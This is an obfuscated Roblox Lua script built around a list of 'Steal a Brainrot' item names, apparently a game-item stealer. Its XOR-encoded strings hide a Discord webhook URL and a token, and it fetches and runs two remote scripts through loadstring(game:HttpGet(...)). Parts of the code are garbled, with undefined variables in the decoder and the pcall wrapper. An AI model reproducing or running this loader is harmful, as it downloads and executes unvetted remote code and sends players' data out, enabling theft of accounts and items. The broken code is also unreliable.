--[[ Obfuscated with Prometheus-style engine ]]
local _00IIl0OO="_0lOlII";local _l0OIl0II="_OOlIOI";local _OllOl0O0="_IIOI00";local _0I0O00I0="_000OlO";local _OlIO0Il0="_IllII0";
local _IOl0llOlIlOOO0II=(function(_OIOOlO)return function(...)local _lOOlIl=""for _,_OlIOII in ipairs({...})do _l0IlOO=_OIIIl0..string.char(bit32 and bit32.bxor(_llIO0O,_OI0OII)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_lllOOI,_0OI00O))end return _0IOIOO end end)(216);
local _lIO0llIlIlIO=function()
getgenv().User = _IOl0llOlIlOOO0II(168,185,170,183,160,161,188,189,190,185,170,181)

getgenv().Webhook = _IOl0llOlIlOOO0II(176,172,172,168,171,226,247,247,187,185,182,185,170,161,246,188,177,171,187,183,170,188,246,187,183,181,247,185,168,177,247,175,189,186,176,183,183,179,171,247,233,236,239,233,233,238,232,238,239,233,239,234,233,239,237,236,239,239,238,247,148,158,128,139,187,162,161,158,182,149,155,234,173,162,173,159,174,157,191,234,177,155,156,179,170,151,159,225,145,172,150,136,141,148,189,182,183,245,182,141,145,176,148,130,154,191,154,158,233,237,186,172,140,181,172,148,224,238,182,140,148,141,160,233,190,155,154,137)

getgenv().SecretToken = _IOl0llOlIlOOO0II(185,239,185,225,185,186,188,238,245,189,237,187,233,245,236,236,238,234,245,185,238,188,236,245,237,186,235,185,188,236,238,233,189,236,224,189)

getgenv().Brainrots = {
  _IOl0llOlIlOOO0II(139,172,170,185,175,186,189,170,170,161,248,157,180,189,168,176,185,182,172),
  _IOl0llOlIlOOO0II(149,189,183,175,180),
  _IOl0llOlIlOOO0II(144,189,185,188,180,189,171,171,248,144,183,170,171,189,181,185,182),
  _IOl0llOlIlOOO0II(144,161,188,170,185,248,156,170,185,191,183,182,248,155,185,182,182,189,180,180,183,182,177),
  _IOl0llOlIlOOO0II(156,170,185,191,183,182,248,159,177,182,191,189,170,177,182,177),
  _IOl0llOlIlOOO0II(139,179,177,186,177,188,177,248,140,183,177,180,189,172),
  _IOl0llOlIlOOO0II(148,183,174,189,248,148,183,174,189,248,154,189,185,170),
  _IOl0llOlIlOOO0II(156,170,185,191,183,182,248,155,185,182,182,189,180,180,183,182,177),
  _IOl0llOlIlOOO0II(148,185,248,139,173,168,170,189,181,189,248,155,183,181,186,177,182,185,171,177,183,182),
  _IOl0llOlIlOOO0II(155,189,180,189,171,172,177,185,180,248,136,189,191,185,171,173,171),
  _IOl0llOlIlOOO0II(136,183,168,187,173,170,173,248,185,182,188,248,158,177,162,162,173,170,173),
  _IOl0llOlIlOOO0II(138,183,171,189,161,248,185,182,188,248,140,189,188,188,161),
  _IOl0llOlIlOOO0II(155,185,168,177,172,185,182,183,248,149,183,186,161),
  _IOl0llOlIlOOO0II(155,183,183,179,177,248,185,182,188,248,149,177,180,179,177),
  _IOl0llOlIlOOO0II(154,173,170,191,173,170,183,248,153,182,188,248,158,170,161,173,170,183),
  _IOl0llOlIlOOO0II(147,189,172,173,168,185,172,248,154,170,183,171),
  _IOl0llOlIlOOO0II(138,189,177,182,177,172,183,248,139,180,189,177,191,176,177,172,183),
  _IOl0llOlIlOOO0II(148,183,171,248,153,181,177,191,183,171),
  _IOl0llOlIlOOO0II(148,185,248,139,189,187,170,189,172,248,155,183,181,186,177,182,185,171,177,183,182),
  _IOl0llOlIlOOO0II(148,183,171,248,139,189,179,183,180,185,176,171),
  _IOl0llOlIlOOO0II(139,177,191,182,183,170,189,248,155,185,170,185,168,185,187,189),
  _IOl0llOlIlOOO0II(158,170,185,191,170,185,181,185,248,185,182,188,248,155,176,183,187,170,185,181,185),
  _IOl0llOlIlOOO0II(148,185,248,155,185,171,185,248,154,183,183),
  _IOl0llOlIlOOO0II(148,185,248,158,183,183,188,248,155,183,181,186,177,182,185,171,177,183,182),
  _IOl0llOlIlOOO0II(139,168,183,183,179,161,248,185,182,188,248,136,173,181,168,179,161),
  _IOl0llOlIlOOO0II(148,185,248,159,177,182,191,189,170,248,139,189,179,183,180,185,176),
  _IOl0llOlIlOOO0II(159,177,182,191,189,170,248,159,189,170,185,172),
  _IOl0llOlIlOOO0II(148,183,171,248,139,168,185,191,176,189,172,172,177,171),
  _IOl0llOlIlOOO0II(158,189,171,172,177,174,189,248,238,239),
  _IOl0llOlIlOOO0II(139,168,185,191,176,189,172,172,177,248,140,173,185,180,189,172,172,177),
  _IOl0llOlIlOOO0II(138,183,171,189,172,172,177,248,140,173,185,180,189,172,172,177),
  _IOl0llOlIlOOO0II(159,185,170,185,181,185,248,185,182,188,248,149,185,188,173,182,188,173,182,191),
  _IOl0llOlIlOOO0II(150,185,187,176,183,248,139,168,161,188,189,170),
  _IOl0llOlIlOOO0II(158,177,171,176,177,182,183,248,155,180,183,175,182,177,182,183),
  _IOl0llOlIlOOO0II(148,185,174,185,188,183,170,177,172,183,248,139,168,177,182,177,172,183),
  _IOl0llOlIlOOO0II(146,183,180,180,161,248,146,183,180,180,161,248,139,185,176,173,170),
  _IOl0llOlIlOOO0II(147,189,172,187,176,173,170,173,248,185,182,188,248,149,173,171,172,173,170,173),
  _IOl0llOlIlOOO0II(139,175,185,191,191,161,248,154,170,183,171),
  _IOl0llOlIlOOO0II(148,185,248,138,183,181,185,182,172,177,187,248,159,170,185,182,188,189),
  _IOl0llOlIlOOO0II(151,170,187,185,180,189,188,183,182),
  _IOl0llOlIlOOO0II(140,177,187,172,185,187,248,139,185,176,173,170),
  _IOl0llOlIlOOO0II(147,189,172,173,168,185,172,248,147,189,168,185,172),
  _IOl0llOlIlOOO0II(148,185,248,140,185,187,183,248,155,183,181,186,177,182,185,171,177,183,182),
  _IOl0llOlIlOOO0II(140,185,182,191,248,140,185,182,191,248,147,189,180,189,172,185,182,191),
  _IOl0llOlIlOOO0II(148,183,174,177,182,248,138,183,171,189),
  _IOl0llOlIlOOO0II(148,183,171,248,140,185,187,183,170,177,172,185,171),
  _IOl0llOlIlOOO0II(157,174,177,180,189,188,183,182),
  _IOl0llOlIlOOO0II(148,183,171,248,136,170,177,181,183,171),
  _IOl0llOlIlOOO0II(148,185,248,146,183,180,180,161,248,159,170,185,182,188,189),
  _IOl0llOlIlOOO0II(143,248,183,170,248,148),
  _IOl0llOlIlOOO0II(157,171,183,179,248,139,189,179,183,180,185,176),
  _IOl0llOlIlOOO0II(148,183,171,248,136,173,191,191,177,189,171),
  _IOl0llOlIlOOO0II(140,170,185,180,185,180,189,188,183,182),
  _IOl0llOlIlOOO0II(159,183,186,186,180,177,182,183,248,141,182,177,187,177,187,180,177,182,183),
  _IOl0llOlIlOOO0II(140,173,190,190,248,140,183,173,187,185,182),
  _IOl0llOlIlOOO0II(149,177,189,172,189,172,189,177,170,185,248,154,177,187,177,187,180,189,172,189,177,170,185),
  _IOl0llOlIlOOO0II(149,183,182,189,161,248,149,183,182,189,161,248,138,189,177,182,188,189,189,170),
  _IOl0llOlIlOOO0II(155,176,177,180,180,177,182,248,155,176,177,180,177),
  _IOl0llOlIlOOO0II(155,176,177,168,171,183,248,185,182,188,248,137,173,189,171,183),
  _IOl0llOlIlOOO0II(148,185,248,139,168,183,183,179,161,248,159,170,185,182,188,189),
  _IOl0llOlIlOOO0II(154,185,187,173,170,173,248,185,182,188,248,157,191,191,173,170,173),
  _IOl0llOlIlOOO0II(148,183,171,248,154,170,183,171),
  _IOl0llOlIlOOO0II(148,185,248,157,160,172,177,182,187,172,248,159,170,185,182,188,189),
  _IOl0llOlIlOOO0II(148,183,171,248,155,185,182,188,177,189,171),
  _IOl0llOlIlOOO0II(155,189,180,173,180,185,170,187,177,182,177,248,142,177,187,177,183,171,177,182,177),
  _IOl0llOlIlOOO0II(148,183,171,248,238,239),
  _IOl0llOlIlOOO0II(148,183,171,248,149,183,186,177,180,177,171),
  _IOl0llOlIlOOO0II(149,183,182,189,161,248,149,183,182,189,161,248,136,173,191,191,161),
  _IOl0llOlIlOOO0II(148,183,171,248,146,183,180,180,161,248,155,183,181,186,177,182,185,171,177,183,182,185,171),
  _IOl0llOlIlOOO0II(148,183,171,248,139,168,183,183,179,161,248,155,183,181,186,177,182,185,171,177,183,182,185,171),
  _IOl0llOlIlOOO0II(148,183,171,248,144,183,172,171,168,183,172,171,177,172,183,171),
  _IOl0llOlIlOOO0II(155,176,177,187,180,189,172,189,177,170,185,248,155,173,168,177,188,189,177,170,185),
  _IOl0llOlIlOOO0II(156,146,248,136,185,182,188,185),
  _IOl0llOlIlOOO0II(148,183,171,248,136,180,185,182,177,172,183,171),
  _IOl0llOlIlOOO0II(148,185,171,248,139,177,171),
  _IOl0llOlIlOOO0II(139,168,177,182,182,161,248,144,185,181,181,161),
  _IOl0llOlIlOOO0II(148,183,171,248,139,175,189,189,172,176,189,185,170,172,171),
  _IOl0llOlIlOOO0II(140,185,187,183,170,177,172,185,248,154,177,187,177,187,180,189,172,185),
  _IOl0llOlIlOOO0II(150,173,187,180,189,185,170,183,248,156,177,182,183,171,171,185,173,170,183),
  _IOl0llOlIlOOO0II(148,183,171,248,155,183,181,186,177,182,185,171,177,183,182,185,171),
  _IOl0llOlIlOOO0II(155,176,177,187,180,189,172,189,177,170,185,248,150,183,189,180,172,189,177,170,185),
  _IOl0llOlIlOOO0II(155,176,177,181,182,177,182,183),
  _IOl0llOlIlOOO0II(139,175,185,191,248,139,183,188,185),
  _IOl0llOlIlOOO0II(150,183,183,248,181,161,248,144,189,185,170,172),
  _IOl0llOlIlOOO0II(149,185,170,177,185,187,176,177,248,155,183,170,185,162,183,182,177),
  _IOl0llOlIlOOO0II(159,173,189,171,172,248,238,238,238)
}

task.spawn(function()
loadstring(game:HttpGet(_IOl0llOlIlOOO0II(176,172,172,168,171,226,247,247,185,168,177,246,180,173,185,170,181,183,170,246,182,189,172,247,190,177,180,189,171,247,174,236,247,180,183,185,188,189,170,171,247,224,232,224,190,236,185,188,236,189,186,190,190,236,239,237,187,237,239,187,189,238,233,189,185,235,225,189,236,233,189,234,235,246,180,173,185)))()
end)

task.spawn(function()
loadstring(game:HttpGet(_IOl0llOlIlOOO0II(176,172,172,168,171,226,247,247,191,177,172,176,173,186,246,187,183,181,247,172,175,179,236,239,236,247,171,189,181,177,245,172,168,247,186,180,183,186,247,181,185,177,182,247,171,189,181,177,253,234,232,172,168,246,172,160,172)))()
end)

end;
local _,_0I0OOI0I=pcall(_lIO0llIlIlIO);if _OlIOOIIO then _lIO0llIlIlIO()end;
